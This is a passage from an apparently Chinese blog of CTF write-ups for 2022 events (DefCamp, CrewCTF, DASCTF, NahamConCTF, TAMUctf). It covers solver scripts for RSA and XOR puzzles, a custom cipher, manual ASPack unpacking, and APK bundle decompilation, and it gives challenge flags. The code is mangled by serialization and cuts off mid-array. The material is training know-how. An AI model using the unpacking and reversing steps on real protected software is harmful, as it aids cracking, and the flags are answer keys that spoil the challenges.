a[n:n + i] for j in range(100): if (polinom(j, 3) == int(s)): b.append(j) dfs(n + i) b.pop() dfs(0)nf=[31, 11, 38, 2, 44, 3, 54, 68, 8, 14, 45, 91, 44, 91, 69, 12, 29, 25, 23, 10, 1]iflag = 31113802440354680814459144916912292523101flag = long_to_bytes(iflag)print(flag) 关于python Crypto.util 模块的byte_to_long和long_to_bytes的使用： [ola_th1s_1s_p0l]","link":"/2022/02/16/CTF/2022-DefCamp-CTF/"},{"title":"2022CrewCTF","text":"这比赛是真的难，脑洞也大，一题都没做出来… Cryptoes-x0rflag.enc给出的字符串 1BRQDER1VHDkeVhQ5BRQfFhIJGw== cyberchef是个神器，但我就是不太会用，wp中写的非常简洁，只是介绍了使用的是cyberchef中的xor brute force功能 摸索了半天，终于解出来了，记得还需要加入from base64 1Key = 66: crew{3z_x0r_crypto}","link":"/2022/04/18/CTF/2022CrewCTF/"},{"title":"2022DASCTF","text":"解出来两题，别的题目等有空再复现 reverseeasyrere签到题，首先是查壳，AS壳，脱壳动调不起来。 ASpack脱壳赛后学习一下如何脱壳： 第一步，运行pushad这个指令，然后发现之后esp改变了，这时候可以使用ESP定律了 第二步，在改变的esp处，右键，数据窗口跟随 第三步，下硬件断点无论选择多少个字节，只要第一个字节是esp所指向的就行，然后下硬件断点，随便是什么大小都行 第四步，F9+数次F8，遇到一个retn大跳转，跳转到奇怪的地方，右键分析，从模块中删除分析 第五步，删除断点 第六步，右键选择od脱壳插件，点击脱壳，选择地方保存即可。可以选择重建或者不重建输入表，都可以试一试。 题解用die查看还能查看到壳 但是用exeinfope查看，已经识别不出来了 放入ida中反汇编，上面那么多的函数，只有最后一个是对输入的字符串进行转换，跟进 动调后发现，真正有效的，只有最后的异或，Str是input，与dword_492940数组异或之后，与v2数组对比 输入符合条件的字符（或者直接头铁修改汇编/flag寄存器可以） 跟进最后的sub_401771函数（tab键切换显示） 只需要在此处下断点，然后f9键，重复循环，记录下eax（注意是低位，也就是最后两位的值，伪代码界面中已规定）的值，也就动调出了dword_492940数组的值 我用x32dbg， 下面是脚本： 1234567arr = [0x38,0x78,0x0D,0xE8,0x0,0xAF,0xBF,0x3A,0x6B,0xFB,0xB8,0x0c,0x85,0x35,0x5c,0xAD,0xE6,0x0,0xE0,0x8A,0x1D,0xBD,0x46,0xD2,0x2B,0x0,0x15,0x24,0xc6,0xad,0xa1,0xc9,0x7b,0x12,0x28,0x0,0x5,0x0,0x72,0x3e,0x10,0xa1]v2 = [-61,-128,-43,-14,-101,-48,11,-76,85,-34,34,-125,47,-105,-72,32,29,116,-47,1,115,26,-78,-56,-59,116,-64,91,-9,15,-45,1,85,-78,-92,-82,123,-84,92,86,-68,35]flag = []for i in range(len(arr)): flag.append((v2[i]-71)^arr[i])for i in flag: print(chr(i%128),end = &quot;&quot;) DA\u0003CT&amp;{Welc0me-t0-j01n-SU-l0ve-suyug1eg1e} cryptoFlowerCipher12345678910111213141516171819202122232425# pythonfrom md5 import *#from secret import flagimport randomflag = b'flag{%s}' % md5(&quot;hello&quot;).hexdigest()# note that md5 only have characters 'abcdef' and digitsprint(flag)def Flower(x, key): flower = random.randint(0, 4096) return x * (key ** 3 + flower)flag = flag[5:-1]rounds = len(flag)L, R = 1, 0for i in range(rounds): L, R = R + Flower(L, flag[i]), Lprint(L, R)'''L = 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 R = 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003''' 就是找规律 我用的是字符串“hello”的md5值进行测试的，顺带输出了随机数flower的值 截取flag括住的md5字符串，将每位的md5字符的ascii码值的三次方，与随机数flower相加后，x对其进行相乘的轮运算。 我这边就不分什么L和R了，同一就L吧 L的值经过运行，会共有33个结果，我只列出5个（别忘了R的初始值为0，得算上） 10,1,152499,152850662695，21934987200861169…… 首先是从1得到111582这个值， 1 * (ord(“5”) ** 3 + 3622(随机数) ) + 0 == 152499 152499 * (ord(“d”) ** 3 + 2306(随机数) ) + 1 == 152850662695 152850662695 * (ord(“4”) ** 3 + 2898(随机数)) + 152499 == 21934987200861169 …… 有个细节就是关于md5，ascii码的爆破，只有16个值，我们将其的三次方统计出来，然后再带入，就能避免爆破时的重复运算。 我的代码只有两段，总体来说有以下几个步骤： 把题目给出的L和R放入第一段代码中爆破，找出与Ln最相近(至少头5位以上相同)的那个数L 记录L的值，再将Ln和L放到第二段代码中算出（Ln-L） 颠倒次序，把Rn的值放入Ln，把（Ln-L）放入Rn 下一轮爆破 123456789Ln = 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 Rn = 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003table = [110592, 117649, 125000, 132651, 140608, 148877, 157464, 166375, 175616, 185193, 912673, 941192, 970299, 1000000, 1030301, 1061208]arr = &quot;0123456789abcdef&quot;for k in range(len(table)): for i in range(4097): s = Rn * (table[k]+i) print(s,i,k) 123L = XXL2 = XXprint(L1-L2) 以下是我记录的结果，也顺便把flower随机数给求出来了 1234567891011121314151617181920212223242526272829303132# 15720197268010049967757675120469992186537658494704135479561283085920610969374470767952957875436059114121446299016141673102641832905150384839824642839374686669270876487929996533 1919 0# 139721425168891349281451572792544680133048837962069857150100615261867817820225178415462359077837226554096748311704122075309731667870724937930248453782400769574967523270642 510 5# 935298420630262423185150206646668885399191421990835568861492588788973905537009439370462836218449045234881355649430474024746318871954304126501288629400235458740127101 1341 2# 7402968320531989835670241249457421938283688514175514626293968883156349035945739737904361257497353379629413158206906713676778417021296445905576431695996715641300 2804 8# 41491807644826481333056571242042987763162606518088912744473506551739700646996757137623352025000231061906119571673189237339386631862081048474757647974486052 3540 0# 363542281257405436738062356377499261443865043865819271011660681964779781594783648490405407084091956921600660152274552384722839809777207315962395724219 2014 1# 3038050869988262429655157757050855487684960921705258160397820501320186928458237610126810889102968352283119686135758844661757227858541497892329978 2910 12# 3121683903427741450531538690298173116055843159376206844245035131620220173908400102678527763657957532736559255674205238569272853603347684360 1583 9# 16713517279651699427416237029968408926588205411468552569137856325095699110951088692439450366166993887875519154383257203446616180663090 1553 11# 17728566345759946219419043899895158573935956749824781372783616735461960720379964461326804126448830581009804233228809205290722005 677 11# 18822751726345982203536113956628287336349341818556411576055283361468981935791538263907057292686428250726627439749346855794 2623 12# 19346619488846194559561002486970415604137588112233495035918509580946584549555534897772973203882140940841422311351882 2182 13# 19304497076062675076996611100676013925228610670849154654479793346504090311378449485002713890157750241704060905 899 13# 19287157920117788313343479701196130159642868618931955510796952126270844726755147453674899267075236180510 536 1# 163194634847106630304640801569246968479812515049711601031768905677844430993957504882527310932658385 1206 7# 973825402916378169077745443044681608822639561953870686694312206745163458824521668260965989574 4070 6# 6028609474854126199515278609291926142756502224800248232787857670670545743680405264374000 3699 14# 5830376667896185002654420350650782884309207250500677414733204240590442735335736536 2360 8# 32759342090244825649040695774567282547692783729977476494686456263546407645500 3129 3# 241267801517462008306176189488648150382335625618648940556475948111371047 3927 13# 240324048965397603464474529360761469453780103694211768036773812736 2623 6# 1501209023616087621185251887472189877470525030158230860929775 2967 2# 11731219952133874353623065586006692045981599038444975155 427 15# 11050144307659161397338047811281198461104120235200 259 14# 10722465753785810850086192105446537156391682 330 6# 67952303343060595219909806911058324892 2545 6# 424678007753497956261063331068660 3868 11# 449366185988738790777629544 398 7# 2694478038806093981253 217 0# 24316418691544200 1240 8# 137492755074 1021 14# 133317 666 3 flag就出来了 1234arr = &quot;0123456789abcdef&quot;flag = [3,14,8,0,7,11,6,6,14,15,2,6,13,3,8,14,6,7,1,13,13,12,11,11,9,12,1,0,8,2,5,0]for i in flag: print(arr[i],end = &quot;&quot;) DASCTF{3e807b66ef26d38e671ddcbb9c108250}","link":"/2022/03/27/CTF/2022DASCTF/"},{"title":"2022NahamConCTF","text":"这边只记录一些有意思的题，主要是记录复现题 unimod1234567891011import randomflag = open('flag.txt', 'r').read()ct = ''k = random.randrange(0,0xFFFD)for c in flag: ct += chr((ord(c) + k) % 0xFFFD)open('out', 'w').write(ct)# out文件# 饇饍饂饈饜餕饆餗餙饅餒餗饂餗餒饃饄餓饆饂餘餓饅餖饇餚餘餒餔餕餕饆餙餕饇餒餒饞飫 我猜测是unnicode编码，找个网站转一下 flag第一个字符为”f”，算出k，即可。 1234567ct = [0x9947,0x994d,0x9942,0x9948,0x995c,0x9915,0x9946,0x9917,0x9919,0x9945,0x9912,0x9917,0x9942,0x9917,0x9912,0x9943,0x9944,0x9913,0x9946,0x9942,0x9918,0x9913,0x9945,0x9916,0x9947,0x991a,0x9918,0x9912,0x9914,0x9915,0x9915,0x9946,0x9919,0x9915,0x9947,0x9912,0x9912,0x995e,0x98eb]k = ct[0]-ord(&quot;f&quot;)flag = &quot;&quot;for i in ct: flag += chr(i-k)print(flag)# flag{4e68d16a61bc2ea72d5f971344e84f11} BabyRSAQuiz这一题还是很有趣的，一共三个挑战，对应三个不同的rsa题型 第一个是最基础的题型 第二个是低加密指数攻击，对n开三次方即可 第三个，给出了p和q的大致关系，需要爆破一下，耽搁了挺久的 解密脚本 123456789101112131415161718192021222324252627import gmpy2from Crypto.Util import numberdef challenge3(): n = 116977074228599426291587221908436017777467258431559447697924941520570885658886480019669892575150152280335170175559423087532259109936665895429503951416006622462618553942370439526762985810142970058271286185509592222692211236949490404435899918812532981985758364660301644565952909138955690838261582018908922468119 s = gmpy2.iroot(n,2)[0] for i in range(10000): a = 2*i m = (s-a+1)*(s+a+1) re = n - m if m == n: print(&quot;done&quot;) print((s-2*i+1),(s+(2*i+1))) break elif re &gt;-200000 and re &lt; 200000: print(-a+1,a+1) print(re) p = s - 308 q = s + 310 e = 65537 c = 4229254487221676800780096678163450260842675507793572972787457878570797072562036544554415758463878561718810656685314768162698600790351018583535201368597827407410173247765734037714029965319789400903852994184676867936771131535515140905245959496886324335917176883986099816968694152979333841398712040545041994202 d = gmpy2.invert(e,(q-1)*(p-1)) m = pow(c,d,n) print(m) print(number.long_to_bytes(m))challenge3() s是n开方之后的结果，通过爆破p和q，获取p*q的值与n的差值，可以确定p = (s-2i)，q = (s+2i) ,这样我我们就能确定p和q相对于s的偏移，即可确定p和q的值，进而求解 XORROX123456789101112131415161718192021222324252627r/bin/env python3import randomwith open(&quot;flag.txt&quot;, &quot;rb&quot;) as filp: flag = filp.read().strip()key = [random.randint(1, 256) for _ in range(len(flag))]xorrox = []enc = []for i, v in enumerate(key): k = 1 for j in range(i, 0, -1): k ^= key[j] xorrox.append(k) enc.append(flag[i] ^ v)with open(&quot;output.txt&quot;, &quot;w&quot;) as filp: filp.write(f&quot;{xorrox=}\\n&quot;) filp.write(f&quot;{enc=}\\n&quot;)# output文件#xorrox=[1, 209, 108, 239, 4, 55, 34, 174, 79, 117, 8, 222, 123, 99, 184, 202, 95, 255, 175, 138, 150, 28, 183, 6, 168, 43, 205, 105, 92, 250, 28, 80, 31, 201, 46, 20, 50, 56]#enc=[26, 188, 220, 228, 144, 1, 36, 185, 214, 11, 25, 178, 145, 47, 237, 70, 244, 149, 98, 20, 46, 187, 207, 136, 154, 231, 131, 193, 84, 148, 212, 126, 126, 226, 211, 10, 20, 119] 这题还是需要去找规律的，不理解意思，硬逆是行不通的 题目首先是随机产生了flag长度的key，然后对每个key[i]与key[0]……key[i-1]元素进行异或，并且将最后异或完成的key[i]值与flag进行异或，所以我们需要求得key列表 123456789101112131415161718xorrox=[1, 209, 108, 239, 4, 55, 34, 174, 79, 117, 8, 222, 123, 99, 184, 202, 95, 255, 175, 138, 150, 28, 183, 6, 168, 43, 205, 105, 92, 250, 28, 80, 31, 201, 46, 20, 50, 56]enc=[26, 188, 220, 228, 144, 1, 36, 185, 214, 11, 25, 178, 145, 47, 237, 70, 244, 149, 98, 20, 46, 187, 207, 136, 154, 231, 131, 193, 84, 148, 212, 126, 126, 226, 211, 10, 20, 119]# for i, v in enumerate(key):key = []# key = [124, 208, 189, 131, 235]# for i, v in enumerate(key):flag = [102, 108, 97, 103, 123]for i in range(0,len(xorrox)-1): key.append(xorrox[i]^xorrox[i+1])flag = &quot;&quot;key = [124,208, 189, 131, 235, 51, 21, 140, 225, 58, 125, 214, 165, 24, 219, 114, 149, 160, 80, 37, 28, 138, 171, 177, 174, 131, 230, 164, 53, 166, 230, 76, 79, 214, 231, 58, 38, 10]for i in range(len(key)): flag += chr(key[i]^enc[i])print(key)print(flag) eayrev用ida打开，输入用户名之后，输入密码，进入sub_12B2函数 主要加密算法在这边，因为s是char*类型的指针，指向了input传参，v6是input的长度 加密结束之后与dword_4020数组进行比较 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned char ida_chars[] ={ 0x66, 0x00, 0x00, 0x00, 0xD9, 0x00, 0x00, 0x00, 0x88, 0x01, 0x00, 0x00, 0x41, 0x03, 0x00, 0x00, 0xC0, 0x07, 0x00, 0x00, 0xF9, 0x06, 0x00, 0x00, 0xA4, 0x18, 0x00, 0x00, 0x95, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x00, 0x00, 0xD5, 0x01, 0x00, 0x00, 0x7C, 0x03, 0x00, 0x00, 0xA9, 0x03, 0x00, 0x00, 0xB0, 0x07, 0x00, 0x00, 0x69, 0x19, 0x00, 0x00, 0x27, 0x01, 0x00, 0x00, 0xA3, 0x01, 0x00, 0x00, 0xC4, 0x01, 0x00, 0x00, 0xB9, 0x02, 0x00, 0x00, 0x54, 0x07, 0x00, 0x00, 0x89, 0x08, 0x00, 0x00, 0x50, 0x0F, 0x00, 0x00, 0xF0, 0x01, 0x00, 0x00, 0x54, 0x02, 0x00, 0x00, 0xD9, 0x02, 0x00, 0x00, 0x58, 0x05, 0x00, 0x00, 0x71, 0x05, 0x00, 0x00, 0x24, 0x09, 0x00, 0x00, 0x19, 0x10, 0x00, 0x00, 0x42, 0x03, 0x00, 0x00, 0xAD, 0x03, 0x00, 0x00, 0x08, 0x05, 0x00, 0x00, 0xE9, 0x06, 0x00, 0x00, 0x30, 0x0A, 0x00, 0x00, 0xE1, 0x10, 0x00, 0x00, 0x84, 0x12, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0xD2, 0x05, 0x00, 0x00, 0x4D, 0x07, 0x00, 0x00};char flag[40] = {0};int main(int argc, char** argv[]){ //printf(&quot;%d\\n&quot;,sizeof(long long unsigned)); int* px = (int *)ida_chars; for(int i = 0;i&lt;38;i++){ printf(&quot;%x\\n&quot;,*px); flag[i] = (*px - (i*i))&gt;&gt;(i%7); px++; } for(int i = 0; i&lt; 38;i++){ printf(&quot;%c&quot;,flag[i]); } getchar(); return 0;}//flag{7bdeac39cca13a97782c04522aece87a} Quirky给出的文件： 1\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x6f\\x00\\x00\\x00\\x6f\\x01\\x03\\x00\\x00\\x00\\xd8\\x0b\\x0c\\x23\\x00\\x00\\x00\\x06\\x50\\x4c\\x54\\x45\\x00\\x00\\x00\\xff\\xff\\xff\\xa5\\xd9\\x9f\\xdd\\x00\\x00\\x00\\x02\\x74\\x52\\x4e\\x53\\xff\\xff\\xc8\\xb5\\xdf\\xc7\\x00\\x00\\x00\\x09\\x70\\x48\\x59\\x73\\x00\\x00\\x0b\\x12\\x00\\x00\\x0b\\x12\\x01\\xd2\\xdd\\x7e\\xfc\\x00\\x00\\x01\\x25\\x49\\x44\\x41\\x54\\x38\\x8d\\xd5\\xd4\\x31\\x8e\\xc3\\x20\\x10\\x05\\xd0\\xb1\\x5c\\xd0\\x25\\x17\\x40\\x9a\\x6b\\xd0\\x71\\x25\\xfb\\x02\\xb6\\xf7\\x02\\xce\\x95\\xe8\\xb8\\x06\\x92\\x2f\\x40\\x3a\\x0a\\x94\\xd9\\x8f\\x23\\x45\\xbb\\xc5\\x66\\x68\\x52\\x2c\\xa2\\xe0\\x21\\x21\\xcf\\x0c\\x83\\x49\\x7e\\x0d\\xfa\\x1f\\xcc\\x44\\x8b\\xaf\\x6b\\xb0\\x44\\xac\\xf2\\x2e\\x75\\x72\\xe3\\x66\\xea\\x2a\\x1d\\x0c\\x76\\xc1\\xe7\\x82\\x9d\\x4c\\x17\\x27\\x97\\xc8\\xd4\\x4e\\xae\\x91\\xd6\\x62\\xbb\\x28\\x75\\x8e\\xf5\\x1a\\xed\\x2b\\xc8\\x37\\x44\\xbe\\x73\\xb4\\x98\\xaf\\xf4\\xdf\\xf0\\x1c\\xf6\\x5a\\x7e\\x16\\xf6\\x4f\\x66\\xb2\\x64\\x78\\xf3\\xc7\\xee\\x3a\\xe8\\x0f\\xac\\x25\\x10\\x39\\x56\\x79\\x2f\\x74\\x71\\xe3\\x57\\x94\\x87\\x11\\x9d\\xf1\\xd8\\x5b\\x6c\\x34\\x79\\x9d\\x0f\\x8f\\xb3\\xb2\\xfb\\x73\\x53\\xa5\\x3b\\x36\\x33\\xa2\\xf8\\x73\\x60\\x95\\x52\\xea\\x10\\xd3\\xc5\\xf0\\x7e\\x46\\xf5\\x9e\\x77\\x19\\x6f\\x6d\\x4a\\x76\\x3a\\x25\\xa0\\x49\\xda\\x05\\xdd\\x22\\xab\\x44\\xbe\\x38\\x28\\x25\\xcd\\xa5\\x83\\x92\\x86\\x82\\x90\\x0e\\x14\\x53\\x67\\x44\\x1f\\xd6\\x39\\xa0\\xfe\\xac\\xb3\\x9d\\x95\\xdd\\x10\\x19\\x51\\x89\\x91\\x3d\\x21\\xa4\\xec\\x58\\x25\\x3a\\x76\\xf2\\x69\\x68\\xaf\\x4c\\x54\\xe2\\x2d\\x2c\\x1e\\x95\\xe4\\xec\\x59\\x27\\xae\\x52\\xd0\\xb4\\x34\\x3c\\xf3\\x55\\x89\\x85\\xf0\\xc3\\x71\\x17\\x0b\\xdf\\x42\\x22\\x27\\x3a\\xf1\\x7e\\xd1\\x2d\\x68\\xaa\\xa2\\xb3\\xe5\\xdb\\x3a\\x56\\xb2\\xd1\\xf9\\xb9\\x5f\\xee\\xa7\\xf8\\x0d\\x69\\xf5\\x37\\x77\\x6e\\xf8\\x09\\x97\\x00\\x00\\x00\\x00\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82 在网上找一个数组转二进制文件的脚本跑一下： 12345678import structarr = [0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x6f,0x00,0x00,0x00,0x6f,0x01,0x03,0x00,0x00,0x00,0xd8,0x0b,0x0c,0x23,0x00,0x00,0x00,0x06,0x50,0x4c,0x54,0x45,0x00,0x00,0x00,0xff,0xff,0xff,0xa5,0xd9,0x9f,0xdd,0x00,0x00,0x00,0x02,0x74,0x52,0x4e,0x53,0xff,0xff,0xc8,0xb5,0xdf,0xc7,0x00,0x00,0x00,0x09,0x70,0x48,0x59,0x73,0x00,0x00,0x0b,0x12,0x00,0x00,0x0b,0x12,0x01,0xd2,0xdd,0x7e,0xfc,0x00,0x00,0x01,0x25,0x49,0x44,0x41,0x54,0x38,0x8d,0xd5,0xd4,0x31,0x8e,0xc3,0x20,0x10,0x05,0xd0,0xb1,0x5c,0xd0,0x25,0x17,0x40,0x9a,0x6b,0xd0,0x71,0x25,0xfb,0x02,0xb6,0xf7,0x02,0xce,0x95,0xe8,0xb8,0x06,0x92,0x2f,0x40,0x3a,0x0a,0x94,0xd9,0x8f,0x23,0x45,0xbb,0xc5,0x66,0x68,0x52,0x2c,0xa2,0xe0,0x21,0x21,0xcf,0x0c,0x83,0x49,0x7e,0x0d,0xfa,0x1f,0xcc,0x44,0x8b,0xaf,0x6b,0xb0,0x44,0xac,0xf2,0x2e,0x75,0x72,0xe3,0x66,0xea,0x2a,0x1d,0x0c,0x76,0xc1,0xe7,0x82,0x9d,0x4c,0x17,0x27,0x97,0xc8,0xd4,0x4e,0xae,0x91,0xd6,0x62,0xbb,0x28,0x75,0x8e,0xf5,0x1a,0xed,0x2b,0xc8,0x37,0x44,0xbe,0x73,0xb4,0x98,0xaf,0xf4,0xdf,0xf0,0x1c,0xf6,0x5a,0x7e,0x16,0xf6,0x4f,0x66,0xb2,0x64,0x78,0xf3,0xc7,0xee,0x3a,0xe8,0x0f,0xac,0x25,0x10,0x39,0x56,0x79,0x2f,0x74,0x71,0xe3,0x57,0x94,0x87,0x11,0x9d,0xf1,0xd8,0x5b,0x6c,0x34,0x79,0x9d,0x0f,0x8f,0xb3,0xb2,0xfb,0x73,0x53,0xa5,0x3b,0x36,0x33,0xa2,0xf8,0x73,0x60,0x95,0x52,0xea,0x10,0xd3,0xc5,0xf0,0x7e,0x46,0xf5,0x9e,0x77,0x19,0x6f,0x6d,0x4a,0x76,0x3a,0x25,0xa0,0x49,0xda,0x05,0xdd,0x22,0xab,0x44,0xbe,0x38,0x28,0x25,0xcd,0xa5,0x83,0x92,0x86,0x82,0x90,0x0e,0x14,0x53,0x67,0x44,0x1f,0xd6,0x39,0xa0,0xfe,0xac,0xb3,0x9d,0x95,0xdd,0x10,0x19,0x51,0x89,0x91,0x3d,0x21,0xa4,0xec,0x58,0x25,0x3a,0x76,0xf2,0x69,0x68,0xaf,0x4c,0x54,0xe2,0x2d,0x2c,0x1e,0x95,0xe4,0xec,0x59,0x27,0xae,0x52,0xd0,0xb4,0x34,0x3c,0xf3,0x55,0x89,0x85,0xf0,0xc3,0x71,0x17,0x0b,0xdf,0x42,0x22,0x27,0x3a,0xf1,0x7e,0xd1,0x2d,0x68,0xaa,0xa2,0xb3,0xe5,0xdb,0x3a,0x56,0xb2,0xd1,0xf9,0xb9,0x5f,0xee,0xa7,0xf8,0x0d,0x69,0xf5,0x37,0x77,0x6e,0xf8,0x09,0x97,0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82] #待写入的数据with open(&quot;./testfile.png&quot;,&quot;wb&quot;) as fp: for x in arr: s = struct.pack('B',x)#转换为字节流字符串，B代表unsigned char fp.write(s) 之后就会出一个二维码，扫描即可 moblize [复现]这题记得是没在模拟器上安装成功，就跳过了 赛后复现就尴尬了 OTP Vault (ReactJS逆向)[复现]参考链接： 使用apktool 1apk -d OTPVault.apk 不知道能从jadx反汇编的什么特征，得知该程序是使用ReactJS构建的 wp中使用的是以下的工具来反汇编assets目录下的index.android.bundle，需要node环境 在windows中安装就可以了 12npm i -g react-native-decompilernpx react-native-decompiler -i ./index.android.bundle -o ./output 后面发现提取出来的文件有很多的时候，还是转linux了，需要配置一下npm –更新– 参考博客 方法原来不止一种，上述方法确实太过麻烦 直接把apk后缀改成zip,解压出来，找到assets下面的index.android.bundle，直接用notepad打开，复制代码到VScode中，shift+alt+f，代码格式化，搜索失败字符串”Invalid OTP”。 我以为要构造头呢…… 直接上hackbar就行了 flag{5450384e093a0444e6d3d39795dd7ddd} clickme [复现]模拟器版本太低，不能安装","link":"/2022/05/02/CTF/2022NahamConCTF/"},{"title":"2022TAMUctf","text":"复现一下2022TAMUctf CryptoTake a Byte (rsa爆破m)1234N = 142340601329766635770777206868142025827135648303906321521767950463359821968347786484195570468286189226989358219855587259388045702266863705647272136227951246915219010211812867670881597286343297521061070264928021561647069809027686627213745350820280726089198348218787227379658142796612755695608708166251723918573e = 65537gigem{} 给我们的是是很多段经过加密后的数字，刚开始还往共模啥啥啥的地方想，后面想通了…… 单个字符加密，m很小，所以可以直接爆破，代码： 123456789101112131415161718from Crypto.Util.number import*import gmpy2N = 142340601329766635770777206868142025827135648303906321521767950463359821968347786484195570468286189226989358219855587259388045702266863705647272136227951246915219010211812867670881597286343297521061070264928021561647069809027686627213745350820280726089198348218787227379658142796612755695608708166251723918573e = 65537# gigem{enumerable_SeArCh_SpAcEs_4R3_WEAK_0xBEEF}a = []flag = []cn = [20051828644545482229736628106141244640599101529879885105710784481396775912918792507483557891429556884620407940642293639975351089356719043660923842126057955226821006981159497594255367990437808428738966466323561013853912103206228977372401699483483780984788644775884227931090699231710824156773590615893131558850 ,83854283495787275735120594010627089167261415561903905351771023881392119205149149996712721903995141303223259322733171979229792652773426096860777717945754070980584019228373140857713986765572016036475658456042955927590405614234701804222801317429142025509797703330789265419562141374229727994168837095409036338568, 78904501193718450241150044086151978641373210178931228666755925416616937391520262776603032001573248789105989232189683980140752923337223916839724076158142673130469883146293937489870287627936877909351412530215816324887169760023203892122852725894323142185537520826861102859602179425272481969545119988517864383564, 47961603526461820206373269231442662243699573437286707816155792929114872724623413781363451789360584067207761975567708191934626179977752601193951267893009944570285082164961608159621113177642183659229110807063045551397256883594417774681050422815616651040698560706966132185534126489503623440803081090985977432213, 20051828644545482229736628106141244640599101529879885105710784481396775912918792507483557891429556884620407940642293639975351089356719043660923842126057955226821006981159497594255367990437808428738966466323561013853912103206228977372401699483483780984788644775884227931090699231710824156773590615893131558850, 50342105347948345611627592249986702671018845467339751873680689284434037397828309425943485577838862603242724702261411453665542915889037086395252349130557964941605887279611677289199815775718410345602278454276070794003809988713918612327660789198880325185440589681685437854774193273238050212903991357887642097119, 37252146374472726164921719652578798621226025146855762979550162219630912866900335490489201719691924302305340263499768691390122878112296947529489110921062793686813580786870192120206330034119855831790098956530717687094958916807286984557539790337570554750791706656454847999237464594117450042991072036154679689731, 112818630895695330237558305617577608808491509986969200732069951955929932251364558874104191763303450912805007823456809169120010063128101002215135179032019286263896832070761297466440614775868579566194612528194624091277783915479380009610098973715998676163821768538643334255796018687667236622186895735849089889361, 125715069946507780366144878808809224300212960551274879605010482052408758349134723717258128261703755090407531363495393681389781003273832525367919174375688554585181633993270716293180563076928876409243577749893885941402821261253580990806839485615883313684525545246860277249798935689432769907778357156479876894908, 20051828644545482229736628106141244640599101529879885105710784481396775912918792507483557891429556884620407940642293639975351089356719043660923842126057955226821006981159497594255367990437808428738966466323561013853912103206228977372401699483483780984788644775884227931090699231710824156773590615893131558850, 11219660713789204202742696989216077354370568013452048147955373063444762584289531563384783613041048421333474174641298599132215025075661404347086073623827597677669183657195329521851165904770403553075208924844122371098662329185683345513780968553777905403400451650306775485483662325950970846860754141892029127917, 51031363059758405089193348160463680989730341656858001814265143574015792821480761711624131983817195398718296062083806343690857667956418649255305897470096904740514896704079255967071366423466408861234017128184898577130152263270742505678507954658936067263618599633496818184446289877020571051229161033454627784562, 20051828644545482229736628106141244640599101529879885105710784481396775912918792507483557891429556884620407940642293639975351089356719043660923842126057955226821006981159497594255367990437808428738966466323561013853912103206228977372401699483483780984788644775884227931090699231710824156773590615893131558850, 94353374555656679140432492892107777072224010951222839428792394552259349901419711075369544716435688802053471212467218767126427152075974695359186732893927279647288306899749863952520762661851437845697512463124069255934788006797785751896586752330563101877525452643958979838662446804754770114461350964612505415979, 50342105347948345611627592249986702671018845467339751873680689284434037397828309425943485577838862603242724702261411453665542915889037086395252349130557964941605887279611677289199815775718410345602278454276070794003809988713918612327660789198880325185440589681685437854774193273238050212903991357887642097119, 101206936084089077861965565696116970981936043266235415161975679933992218583886515638642681194112143326493125541648525120207299034644593411665089444250305428891364760164249251330524245466146094987103162707712325308046143410030961826258822676430515442383147672767969593475412877254888647114762098272180931811572, 67254646129628315330821461895276282788182808170272492052462924759872150117675855768088908334049065156928537508456326255769374456035182061190105147651242112798644629078961344343013294536015861099527417631431775600866834327770400754918005905068152860008163068937864512592394006154376043034942481137861018914868, 11219660713789204202742696989216077354370568013452048147955373063444762584289531563384783613041048421333474174641298599132215025075661404347086073623827597677669183657195329521851165904770403553075208924844122371098662329185683345513780968553777905403400451650306775485483662325950970846860754141892029127917, 51031363059758405089193348160463680989730341656858001814265143574015792821480761711624131983817195398718296062083806343690857667956418649255305897470096904740514896704079255967071366423466408861234017128184898577130152263270742505678507954658936067263618599633496818184446289877020571051229161033454627784562, 53262097898950169907895963200320421578604241263216375519866779556598589300898376353430890201387074809416791075570528807591652216505658980520277593129830919546499789539018672202351149469485087689428260693344587313500424077358279055359319369172385906651221827739298273593636368029277589942466676028675579890107, 94353374555656679140432492892107777072224010951222839428792394552259349901419711075369544716435688802053471212467218767126427152075974695359186732893927279647288306899749863952520762661851437845697512463124069255934788006797785751896586752330563101877525452643958979838662446804754770114461350964612505415979, 2430438645616574386696425574245374470598549810182175274551885652214527208374526562861228820867373638935782365215708377955921551330618659890583825272558060186500141770859102311920988673134333917490079432864388177046497387985911947044281858191450072948162930628670906708128321904679157636703063571130790364883, 13796177393828527291744511404416839769863259510413728685992376248599162441202291886439660675677653622901648405574058000123496322178999157790425090095832457176589064382002099304938815001660778620620528228883879875536592951049928308283418117379668761286572354085616852536841259829272184591287578895980689843232, 59958730350511228075150752532926434417208614146375879843497364275996730125058747804093584516572137497546625055300915380594242596934257985470532219238262131908875715873418938586007930498091987319190839378667242853492885435289215932820339252655227021838981712704743786062855761031574884243559007082267312838239, 11219660713789204202742696989216077354370568013452048147955373063444762584289531563384783613041048421333474174641298599132215025075661404347086073623827597677669183657195329521851165904770403553075208924844122371098662329185683345513780968553777905403400451650306775485483662325950970846860754141892029127917, 27960058358668029177815036370645008893703736742708799416106479224069084997819345835966184033549093960085114854835973085749253176716922081556372971473056427863766489276998454055480915171947454956293697647039913742958823362234949670623183245204065440198028964059125044566382318231717851158568653882570232170263, 25206543252630958930205925877353547253213958041378586272609603156964586339334901058688724721157586114563529911187329090718119219731718576639754373696098676525209345072282128320977894346339696285763748066024535274855649989445916531649347273210797084517367608205734881845557704134028187681267780369376102696278, 